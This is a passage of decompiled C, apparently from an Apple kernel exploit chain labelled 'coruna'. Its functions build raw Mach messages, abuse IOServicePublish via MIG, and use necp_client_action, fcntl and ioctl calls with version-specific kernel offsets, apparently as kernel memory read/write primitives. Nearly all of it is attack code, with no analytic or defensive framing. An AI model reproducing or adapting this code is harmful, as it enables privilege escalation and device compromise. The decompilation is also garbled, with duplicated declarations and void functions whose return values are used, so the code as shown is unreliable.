            version = (unsigned long)scratch;
            ptr = (char *)((long)ptr + 8);
            do {
            err = _strncmp(path,ptr,len);
            if (err == 0) {
            *addr_2 = *(long *)(ptr + -8);
            {
            size = 1;
            {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail(size);
            }
            return;
            }
            }
            }
            ptr = ptr + 0x48;
            version = version - 1;
            } while (version != 0);
            }
          }
        }
      }
    }
  }
  else {
    scratch = *(uint *)(&k_kernel_slot_1d08 + handle);
next:
    if (0x3f < len) {
      len = 0x40;
    }
    if (scratch != 0) {
      version = (unsigned long)scratch;
      ptr = (char *)((long)ptr + 8);
      do {
        err = _strncmp(path,ptr,len);
        if (err == 0) {
          *addr_2 = *(long *)(ptr + -8);
          {
            size = 1;
            {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail(size);
            }
            return;
            }
          }
        }
        ptr = ptr + 0x48;
        version = version - 1;
      } while (version != 0);
    }
  }
skip:
  size = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail(size);
  }
  return;
}
void coruna_kernel5_residual_246(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return;
  }
  return;
}
void coruna_kernel5_residual_247(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    if ((void *)*val != (void *)0x0) {
      _free((void *)*val);
    }
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return;
  }
  return;
}
void coruna_kernel5_residual_248(long *handle,uint32_t size)
{
  uint u;
  int err;
  long handle;
  
  err = coruna_kernel5_residual_249((int)handle,0xc);
  if (err == 0) {
    handle = *handle;
    u = *(uint *)(handle + 1);
    *(uint32_t *)((unsigned long)u + handle) = size;
    *(uint64_t *)((uint32_t *)((unsigned long)u + handle) + 1) = k_kernel_rodata_word_336e8;
    *(int *)(handle + 1) = (int)handle[1] + 0xc;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}
void coruna_kernel5_residual_249(long *handle,uint size)
{
  void *ptr;
  
  if (((uint)(*(int *)((long)handle + 0xc) - (int)handle[1]) < size) && (size < 0xfffffc00))
  {
    if (*(int *)((long)handle + 0xc) == 0) {
      size = size + 0x41c;
      ptr = _calloc((unsigned long)size,1);
    }
    else {
      size = size + 0x400;
      ptr = _realloc((void *)*handle,(unsigned long)((int)handle[1] + size));
    }
    if (ptr != (void *)0x0) {
      *handle = (long)ptr;
      *(uint *)((long)handle + 0xc) = (int)handle[1] + size;
      if ((int)handle[1] == 0) {
        *(uint32_t *)(handle + 1) = 0x1c;
      }
    }
  }
  return;
}
void coruna_kernel5_residual_250(long *handle,uint64_t val,uint32_t size)
{
  uint64_t *ptr;
  int err;
  
  err = coruna_kernel5_residual_249((int)handle,0x10);
  if (err == 0) {
    ptr = (uint64_t *)((unsigned long)*(uint *)(handle + 1) + *handle);
    *ptr = val;
    *(uint32_t *)(ptr + 1) = 0x2130000;
    *(uint32_t *)((long)ptr + 0xc) = size;
    *(int *)(handle + 1) = (int)handle[1] + 0x10;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}
void coruna_memcpy_1a2bc(long *handle,void *ctx,unsigned long arg)
{
  int err;
  
  err = coruna_kernel5_residual_249(handle,arg);
  if (err == 0) {
    _memcpy((void *)((unsigned long)*(uint *)(handle + 1) + *handle),ctx,arg & 0xffffffff);
    *(int *)(handle + 1) = (int)handle[1] + (int)arg;
  }
  return;
}
void coruna_mach_msg(uint64_t *val,uint32_t size,uint32_t flags_2,uint32_t version_3)
{
  uint32_t u;
  int err;
  mach_msg_size_t send_size;
  uint32_t *ptr;
  
  if ((val != (uint64_t *)0x0) &&
     (ptr = (uint32_t *)*val, ptr != (uint32_t *)0x0)) {
    err = *(int *)(val + 2);
    u = 0x1514;
    if (err != 0) {
      u = 0x80001514;
    }
    *ptr = u;
    send_size = *(mach_msg_size_t *)(val + 1);
    ptr[1] = send_size;
    ptr[2] = flags_2;
    ptr[3] = size;
    ptr[4] = 0;
    ptr[5] = version_3;
    ptr[6] = err;
    _mach_msg((mach_msg_header_t *)*val,0x40001,send_size,0,0,0,0);
  }
  return;
}
void coruna_ioservicegetmatchingservice_1a3ec(void)
{
  long handle;
  
  handle = _IOServiceMatching();
  if (handle != 0) {
    _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,handle);
  }
  return;
}
void coruna_mig_dealloc_reply_port(mach_port_t port,uint64_t val,uint64_t id_2,uint32_t size,
                 uint32_t flags_2,void *ctx,int flags)
{
  unsigned long u;
  uint size;
  byte err;
  mach_port_t rcv_name;
  int err;
  mach_msg_return_t lm5;
  int status;
  mach_msg_header_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint32_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_saved;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t path_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  cache_20 = 0;
  tmp_buf = 0;
  cache_22 = 0;
  cache_21 = 0;
  frame = 0;
  path_buf = 0;
  cache = 0;
  work = 0;
  plist = 0;
  sa_new = 0;
  json_buf = 0;
  url_buf = 0;
  path_buf = 0;
  sa_saved = 0;
  region = 0;
  tmp_buf = 0;
  stack_guard = 0;
  stack_guard = 0;
  sa_new = 0;
  sa_saved = 0;
  serial_buf = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  bootargs = 0;
  action = 0;
  host_info = 0;
  thread_attr = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch.msgh_reserved = 0;
  scratch.msgh_id = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  scratch.msgh_remote_port = 0;
  scratch.msgh_local_port = 0;
  scratch.msgh_bits = 0;
  scratch.msgh_size = 0;
  rcv_name = _mig_get_reply_port();
  if (rcv_name == 0) {
    status = 0;
    err = 0;
    err = 1;
  }
  else {
    scratch.msgh_bits = 0x80001513;
    scratch.msgh_local_port = rcv_name;
    scratch.msgh_remote_port = port;
    scratch.msgh_id = (mach_msg_id_t)k_kernel_rodata_word_33918;
    bootargs = (int)((unsigned long)k_kernel_rodata_word_33918 >> 0x20);
    thread_attr = (int)id_2;
    host_info = (int)((unsigned long)id_2 >> 0x20);
    serial_buf = 0x1000000;
    scratch = coruna_u64_pack((flags_2), (size));
    action = coruna_u64_pack((0x140000), ((uint32_t))action);
    bootargs = *(uint64_t *)k_kernel_ndr_record_slot;
    err = ___strlcpy_chk(&host_info,val,0x80,0x80);
    size = err + 1;
    err = 0;
    if ((size & 7) != 0) {
      err = 8 - (size & 7);
    }
    size = err + size;
    thread_attr = coruna_u64_pack((size), ((uint32_t))thread_attr);
    u = (unsigned long)size;
    *(uint32_t *)((long)&host_info + u) = size;
    *(int *)((long)&host_info + u + 4) = flags;
    _memcpy((void *)((long)&block_ctx + u),ctx,(unsigned long)(uint)(flags << 3));
    lm5 = _mach_msg(&scratch,3,size + flags * 8 + 0x50,0x110,rcv_name,0,0);
    if (lm5 == 0) {
      if (scratch.msgh_id == 0xb9a) {
        if (((int)scratch.msgh_bits < 0) && (bootargs == 1)) {
          err = 1;
          err = thread_attr;
          status = 0;
        }
        else {
          err = 0;
          err = 1;
          status = host_info;
        }
      }
      else {
        err = 0;
        err = 1;
        status = -0x12d;
      }
    }
    else {
      _mig_dealloc_reply_port(rcv_name);
      err = 0;
      err = 0;
      status = 0;
    }
  }
  if (!(bool)(err & status == 0 & err != 0 & err != -1)) {
    err = 0;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != region) {
    ___stack_chk_fail(err);
  }
  return;
}
void coruna_ioservice_publish_1a674(uint64_t val,uint64_t id_2,mach_port_name_t *arg)
{
  uint8_t *ptr;
  mach_port_t host;
  kern_return_t lk2;
  int err;
  mach_port_name_t scratch;
  io_master_t bootargs;
  
  host = _mach_host_self();
  lk2 = _host_get_io_master(host,&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk2 == 0) &&
     (lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch),
     lk2 == 0)) {
    err = coruna_mig_dealloc_reply_port(bootargs,"IOServicePublish",val,id_2,scratch,0,0);
    if (err == 0) {
      _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
    }
    else {
      *arg = scratch;
    }
  }
  return;
}
void coruna_ioobjectrelease(uint64_t val,int flags)
{
  int err;
  
  while( true ) {
    if (flags == 0) {
      return;
    }
    err = coruna_ioservicegetmatchingservice_1a3ec(val);
    if (1 < err + 1U) break;
    _sleep(1);
    flags = flags + -1;
  }
  _IOObjectRelease();
  return;
}
void coruna_thread_policy_set(thread_act_t arg,thread_policy_t arg_x)
{
  kern_return_t lk1;
  
  lk1 = _thread_policy_set(arg,2,arg_x,4);
  if (lk1 == 0) {
    _thread_policy_set(arg,3,arg_x + 4,1);
  }
  return;
}
void coruna_mach_timebase_info(uint64_t val,uint size)
{
  kern_return_t lk1;
  double ld2;
  double ld3;
  mach_timebase_info_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint64_t serial_buf;
  
  lk1 = _mach_timebase_info(&scratch);
  if (lk1 == 0) {
    ld2 = (double)NEON_ucvtf((unsigned long)scratch.denom);
    ld3 = (double)NEON_ucvtf((unsigned long)scratch.numer);
    ld2 = (ld2 / ld3) * k_kernel_rodata_word_33920;
    bootargs = (int)(ld2 * (double)size);
    thread_attr = (int)(ld2 * 50.0);
    serial_buf = k_kernel_rodata_word_33928;
    host_info = bootargs;
    coruna_thread_policy_set(val,&bootargs);
  }
  return;
}
void coruna_call_mach_timebase_info(uint64_t val)
{
  coruna_mach_timebase_info(val,0x32);
  return;
}
void coruna_kernel5_residual_251(long handle,uint size)
{
  if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (0x3f < size) {
      return;
    }
    *(uint32_t *)(*(long *)(handle + 0x118) + (unsigned long)size) = 0;
  }
  return;
}
void coruna_mach_absolute_time_1a9c0(long handle,uint size,uint flags_2)
{
  byte *ptr;
  byte err;
  char err;
  bool status;
  unsigned long u;
  uint64_t size;
  uint64_t version;
  long handle;
  
  handle = *(long *)(handle + 0x118);
  if (((handle != 0) && (*(long *)(handle + 0x120) != 0)) && (size < 0x40)) {
    size = _mach_absolute_time();
    ptr = (byte *)(handle + (unsigned long)size);
    do {
      err = *ptr;
      err = '\x01';
      status = (bool)coruna_ldrex_pass(ptr,0x10);
      if (status) {
        *ptr = 1;
        err = coruna_ldrexp_clear();
      }
    } while (err != '\0');
    while ((err & 1) != 0) {
      if (flags_2 != 0) {
        version = _mach_absolute_time();
        u = 0;
        if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
          u = ((version - size) * (unsigned long)*(uint *)(handle + 0x25c)) /
                  (unsigned long)*(uint *)(handle + 0x260);
        }
        if ((unsigned long)flags_2 < u / 1000000) {
          return;
        }
      }
      _thread_switch(0,2,1);
      do {
        err = *ptr;
        err = '\x01';
        status = (bool)coruna_ldrex_pass(ptr,0x10);
        if (status) {
          *ptr = 1;
          err = coruna_ldrexp_clear();
        }
      } while (err != '\0');
    }
  }
  return;
}
void coruna_close(int flags)
{
  int err;
  
  err = _close(flags);
  if (err != 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_open_dev_null(int *flags)
{
  int err;
  
  err = _open("/dev/null",0x20);
  if (err < 0) {
    ___error();
    ___error();
  }
  else {
    *flags = err;
  }
  return;
}
void coruna_kernel5_via_u64_pack(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  int err;
  long handle;
  long scratch;
  long bootargs;
  long thread_attr;
  uint32_t host_info;
  uint32_t scratch;
  uint32_t serial_buf;
  uint32_t bootargs;
  long action;
  uint32_t block_ctx;
  
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&block_ctx), err == 0 && (err = coruna_kernel5_residual_236(ptr), err == 0)))
       ) {
      scratch = 0;
      serial_buf = 0;
      bootargs = 0x10000000;
      host_info = size;
      action = addr_2;
      err = coruna_kernel5_residual_237(ptr,&host_info,0x18);
      if ((err == 0) &&
         ((err = coruna_kernel5_residual_238(ptr,&scratch,0x18), err == 0 &&
          ((coruna_u64_pack((scratch), (host_info)) == scratch && coruna_u64_pack((bootargs), (serial_buf)) == bootargs)
           && action == thread_attr)))) {
        coruna_kernel5_residual_238(&k_kernel_slot_1938 + handle,val,size);
      }
      if (flags == 0) {
        return;
      }
    }
    coruna_close(block_ctx);
  }
  return;
}
void coruna_kernel5_via_open_dev_null(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  int err;
  long handle;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint32_t block_ctx;
  
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&block_ctx), err == 0 && (err = coruna_kernel5_residual_236(ptr), err == 0)))
       ) {
      serial_buf = k_kernel_rodata_word_00033948;
      host_info = k_kernel_rodata_word_33940;
      action = addr_2;
      err = coruna_kernel5_residual_237(ptr,&host_info,0x18);
      if ((err == 0) &&
         ((err = coruna_kernel5_residual_238(ptr,&scratch,0x18), err == 0 &&
          ((host_info == scratch && serial_buf == bootargs) && action == thread_attr)))) {
        coruna_kernel5_residual_237(&k_kernel_slot_1938 + handle,val,size);
      }
      if (flags == 0) {
        return;
      }
    }
    coruna_close(block_ctx);
  }
  return;
}
void coruna_kernel5_residual_252(long handle,uint64_t *val,long addr_2,uint64_t id_2,int flags)
{
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[2] = k_kernel_rodata_word_33930;
  *(uint32_t *)((long)val + 0x1c) = 0;
  if ((flags == 7) && (*(long *)(handle + 0x220) != 0)) {
    val[5] = *(long *)(handle + 0x220);
    val[7] = addr_2 + 0x60;
    val[0xd] = id_2;
  }
  else {
    val[5] = addr_2 + 0x60;
    val[7] = id_2;
    *(int *)(val + 0xc) = flags;
  }
  val[8] = 0;
  *(uint8_t *)((long)val + 0x53) = 0x22;
  val[0xb] = 0;
  return;
}
void coruna_kernel5_residual_253(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint u;
  int err;
  unsigned long size;
  uint8_t scratch[96];
  uint8_t bootargs[96];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(val,size_3,0x60,bootargs,1);
  if (err == 0) {
    size = 0x2800f;
  }
  else {
    size = coruna_kernel5_residual_237(id_2,bootargs,0x60);
    if (((int)size == 0) && (size = coruna_kernel5_residual_238(id_2,scratch,0x60), (int)size == 0)) {
      err = _memcmp(bootargs,scratch,0x60);
      u = 0;
      if (err != 0) {
        u = 0xad014;
      }
      size = (unsigned long)u;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(size);
  }
  return;
}
void coruna_ret_stub_6(void)
{
  coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3();
  return;
}
void coruna_uuid_is_null(long handle)
{
  uint32_t u;
  int err;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    if (*(long *)(handle + 0x230) == 0) {
      return;
    }
    if (*(long *)(handle + 0x228) == 0) {
      return;
    }
    if (*(char *)(handle + 0xb) == '\0') {
      return;
    }
    u = 0x800100;
  }
  else {
    if (*(int *)(&k_kernel_slot_1944 + handle) == -1) {
      return;
    }
    err = _uuid_is_null(&k_kernel_slot_1948 + handle);
    if (err != 0) {
      return;
    }
    if (*(long *)(&k_kernel_slot_1958 + handle) == 0) {
      return;
    }
    if (*(char *)(handle + 0xb) == '\0') {
      return;
    }
    u = 0x8000100;
  }
  coruna_pacia_12(handle,u);
  return;
}
void coruna_necp_client_action(long handle)
{
  long handle;
  uint32_t u;
  int err;
  int status;
  uint size;
  uint64_t version;
  long addr;
  int *err;
  unsigned long port;
  uint64_t scratch;
  int bootargs;
  long thread_attr;
  long host_info [3];
  uint64_t scratch;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = *(uint32_t *)k_kernel_mach_task_self_slot;
    addr = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_12_19(handle,u,host_info + 2);
    err = (int *)0x0;
    if (addr != 0) {
      *(long *)(handle + 0x230) = addr;
      err = (int *)coruna_kernel5_via_kernel5_via_pacia_12_15(handle,u);
      if (err != (int *)0x0) {
        *(int **)(handle + 0x228) = err;
      }
    }
  }
  else {
    host_info[1] = 0;
    version = _necp_open(0);
    err = (int)version;
    if (err == -1) {
      ___error();
      err = ___error();
    }
    else {
      status = _necp_client_action(version,1,host_info + 2,0x10,host_info + 1,8);
      if (status == -1) {
        ___error();
        ___error();
      }
      else {
        status = coruna_kernel5_via_pacia_21(handle,version,host_info);
        if (((status == 0) &&
            (status = coruna_kernel5_residual_257(handle,host_info[0] + 0x18,&thread_attr), status != 0)) &&
           (addr = coruna_pacia(handle,thread_attr), addr != 0)) {
          port = *(unsigned long *)(handle + 0x158);
          addr = 0x570;
          if (port < 0x1f541e00000000) {
            addr = 0x370;
          }
          handle = 0x580;
          if (port >> 0x2b < 1099) {
            handle = addr;
          }
          err = (int *)coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,handle + thread_attr,4,&bootargs,1);
          if ((int)err != 0) {
            if (bootargs == 8) {
              addr = 0x578;
              if (port < 0x1f541e00000000) {
                addr = 0x378;
              }
              handle = 0x588;
              if (port >> 0x2b < 1099) {
                handle = addr;
              }
              err = (int *)coruna_kernel5_residual_257(handle,thread_attr + handle,&scratch);
              if (((int)err != 0) &&
                 (err = (int *)coruna_pacia(handle,scratch), err != (int *)0x0)) {
                *(int *)(&k_kernel_slot_1944 + handle) = err;
                *(uint64_t *)(&UNK_00001950 + handle) = scratch;
                *(long *)(&k_kernel_slot_1948 + handle) = host_info[2];
                *(long *)(&k_kernel_slot_1958 + handle) = thread_attr;
              }
            }
            {
              if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
              ___stack_chk_fail(err);
              }
              return;
            }
          }
        }
      }
      size = _close(err);
      err = (int *)(unsigned long)size;
    }
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(err);
  }
  return;
}
void coruna_kernel5_via_open_dev_null_2(long handle)
{
  int err;
  uint32_t scratch;
  
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      if (*(int *)(&k_kernel_slot_1944 + handle) != -1) {
        _close(*(int *)(&k_kernel_slot_1944 + handle));
        *(uint32_t *)(&k_kernel_slot_1944 + handle) = 0xffffffff;
      }
      *(uint64_t *)(&UNK_00001950 + handle) = 0;
      *(uint64_t *)(&k_kernel_slot_1948 + handle) = 0;
      *(uint64_t *)(&k_kernel_slot_1958 + handle) = 0;
      coruna_close(scratch);
    }
  }
  return;
}
void coruna_pacia_4(void)
{
  return;
}
void coruna_kernel5_residual_254(long handle)
{
  if (((((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       (*(int *)(&k_kernel_slot_1940 + handle) == -1)) || (*(long *)(handle + 0x218) == 0)) &&
     (((*(int *)(handle + 0xe8) + 1U < 2 || (*(long *)(handle + 0xf8) == 0)) ||
      ((*(long *)(handle + 0x100) == 0 || (0x2711 < *(int *)(handle + 0x140))))))) {
    return;
  }
  return;
}
void coruna_fcntl_1b580(long handle,long addr_2,long off_3,uint size,int flags)
{
  unsigned long u;
  int *err;
  int err;
  uint size;
  long handle;
  int *status;
  uint *ptr;
  uint version;
  unsigned long port;
  unsigned long tag;
  uint kind;
  size_t ls12;
  uint32_t scratch;
  uint8_t bootargs[160];
  int thread_attr [42];
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + handle) != -1)) &&
     ((*(long *)(handle + 0x218) != 0 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    err = (int *)(&k_kernel_slot_1930 + handle);
    scratch = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&scratch), err == 0 && (err = coruna_kernel5_residual_236(err), err == 0))
       )) {
      version = 4;
      if (*(long *)(handle + 0x220) != 0) {
        version = 8;
      }
      if (size != 0) {
        port = 0;
        do {
          u = addr_2 + port;
          kind = size - (int)port;
          ls12 = (size_t)kind;
          if ((((*(unsigned long *)(handle + 0x188) & u) != 0) || (kind < 0x4000)) ||
             (err = coruna_uuid_is_null(handle), err == 0)) {
            if (version < kind || version - kind == 0) {
              tag = 0;
            }
            else {
              size = 0;
              if ((((u - 1) + ls12 ^ (u - 1) + (unsigned long)version) &
                  (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) != 0) {
                size = version - kind;
              }
              tag = (unsigned long)size;
            }
            if (*(long *)(handle + 0x220) == 0) {
              err = coruna_kernel5_residual_255(handle,u - tag);
              if (err == 0) {
                status = ___error();
                *status = 0;
                err = _fcntl(*(int *)(&k_kernel_slot_1940 + handle),5);
                thread_attr[0] = err;
                if ((err == -1) && (status = ___error(), *status != 0)) {
                  status = ___error();
                  err = *status;
                  ptr = (uint *)___error();
                  size = -*ptr;
                  if (-1 < err) {
                    size = *ptr;
                  }
                  size = size | 0x40000000;
                  kind = version;
                }
                else {
                  if (3 < kind) {
                    ls12 = 4;
                  }
                  _memcpy((void *)(off_3 + port),(void *)((long)thread_attr + tag),ls12);
                  size = 0;
                  kind = version;
                }
                goto fail;
              }
            }
            else if (((*err != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
                    (*(long *)(handle + 0x218) != 0)) {
              thread_attr[0x22] = 0;
              thread_attr[0x23] = 0;
              thread_attr[0x20] = 0;
              thread_attr[0x21] = 0;
              thread_attr[0x26] = 0;
              thread_attr[0x27] = 0;
              thread_attr[0x24] = 0;
              thread_attr[0x25] = 0;
              thread_attr[0x1a] = 0;
              thread_attr[0x1b] = 0;
              thread_attr[0x18] = 0;
              thread_attr[0x19] = 0;
              thread_attr[0x1e] = 0;
              thread_attr[0x1f] = 0;
              thread_attr[0x1c] = 0;
              thread_attr[0x1d] = 0;
              thread_attr[0x12] = 0;
              thread_attr[0x13] = 0;
              thread_attr[0x10] = 0;
              thread_attr[0x11] = 0;
              thread_attr[0x16] = 0;
              thread_attr[0x17] = 0;
              thread_attr[0x14] = 0;
              thread_attr[0x15] = 0;
              thread_attr[10] = 0;
              thread_attr[0xb] = 0;
              thread_attr[8] = 0;
              thread_attr[9] = 0;
              thread_attr[0xe] = 0;
              thread_attr[0xf] = 0;
              thread_attr[0xc] = 0;
              thread_attr[0xd] = 0;
              thread_attr[2] = 0;
              thread_attr[3] = 0;
              thread_attr[0] = 0;
              thread_attr[1] = 0;
              thread_attr[6] = 0;
              thread_attr[7] = 0;
              thread_attr[4] = 0;
              thread_attr[5] = 0;
              coruna_kernel5_residual_252(handle,thread_attr,*(long *)(handle + 0x218),(u - tag) + -0x48,7);
              err = coruna_kernel5_residual_237(err,thread_attr,0xa0);
              if (((err == 0) && (err = coruna_kernel5_residual_238(err,bootargs,0xa0), err == 0)) &&
                 (err = _memcmp(thread_attr,bootargs,0xa0), err == 0)) {
                err = _ioctl(*(int *)(&k_kernel_slot_1940 + handle),0x40087367);
                if (err == 0) {
                  if (7 < kind) {
                    ls12 = 8;
                  }
                  _memcpy((void *)(off_3 + port),(void *)((long)thread_attr + tag),ls12);
                  size = 0;
                  kind = version;
                }
                else {
                  status = ___error();
                  err = *status;
                  ptr = (uint *)___error();
                  size = -*ptr;
                  if (-1 < err) {
                    size = *ptr;
                  }
                  size = size | 0x40000000;
                  kind = version;
                }
                goto fail;
              }
            }
done:
            coruna_kernel5_residual_256(handle);
            goto cleanup;
          }
          size = 0x80000;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            size = 0x4000;
          }
          if (size <= kind) {
            kind = size;
          }
          size = coruna_task_map_corpse_info_64(handle,u,off_3 + port,kind);
fail:
          if (size != 0) goto done;
          kind = kind + (int)port;
          port = (unsigned long)kind;
        } while (kind < size);
      }
      coruna_kernel5_residual_256(handle);
cleanup:
      if (flags == 0) goto check_ok;
    }
    coruna_close(scratch);
  }
}
void coruna_task_map_corpse_info_64(long handle,uint64_t val,void *ctx,uint size)
{
  long handle;
  long addr;
  long off;
  int err;
  uint u;
  unsigned long size;
  uint64_t version;
  long base;
  uint64_t port;
  uint64_t scratch;
  long bootargs;
  mach_vm_size_t thread_attr;
  void *host_info;
  uint64_t serial_buf;
  
  serial_buf = val;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    host_info = (void *)coruna_u64_pack((host_info), (size));
    if (*(int *)(&k_kernel_slot_1944 + handle) == -1) {
      return;
    }
    base = *(long *)(&k_kernel_slot_1958 + handle);
    err = _uuid_is_null(&k_kernel_slot_1948 + handle);
    if (err != 0) {
      return;
    }
    if (*(long *)(&k_kernel_slot_1958 + handle) == 0) {
      return;
    }
    size = *(unsigned long *)(handle + 0x158);
    addr = 0x570;
    if (size < 0x1f541e00000000) {
      addr = 0x370;
    }
    off = 0x578;
    if (size < 0x1f541e00000000) {
      off = 0x378;
    }
    handle = 0x580;
    if (size >> 0x2b < 1099) {
      handle = addr;
    }
    handle = handle + base;
    addr = 0x588;
    if (size >> 0x2b < 1099) {
      addr = off;
    }
    err = coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,handle,&host_info,4,0);
    base = base + addr;
    if (((err != 0) &&
        (err = coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,base,&serial_buf,*(uint32_t *)(handle + 0x168),0),
        err != 0)) &&
       (u = _necp_client_action(*(uint32_t *)(&k_kernel_slot_1944 + handle),3,
                                    &k_kernel_slot_1948 + handle,0x10,ctx,size), u != size)
       ) {
      ___error();
      ___error();
    }
    host_info = (void *)((unsigned long)host_info & 0xffffffff00000000);
    coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,handle,&host_info,4,0);
    serial_buf = 0;
    coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,base,&serial_buf,*(uint32_t *)(handle + 0x168),0);
    return;
  }
  host_info = (void *)0x0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  if (0x4000 < size) {
    return;
  }
  if (*(long *)(handle + 0x230) == 0) {
    return;
  }
  if (*(long *)(handle + 0x228) == 0) {
    return;
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 || (*(long *)(handle + 0x218) == 0))))
    {
      if ((host_info != (void *)0x0) && (thread_attr != 0)) {
      _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
      thread_attr);
      }
      return;
    }
    bootargs = *(long *)(handle + 0x218) + 0xc0;
  }
  else {
    {
      if ((host_info != (void *)0x0) && (thread_attr != 0)) {
      _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
      thread_attr);
      }
      return;
    }
    bootargs = *(long *)(handle + 0xf0) + 0x100;
  }
  err = coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,bootargs + 8,&serial_buf,*(uint32_t *)(handle + 0x168),0);
  if (err != 0) {
    version = *(uint64_t *)(handle + 0x228);
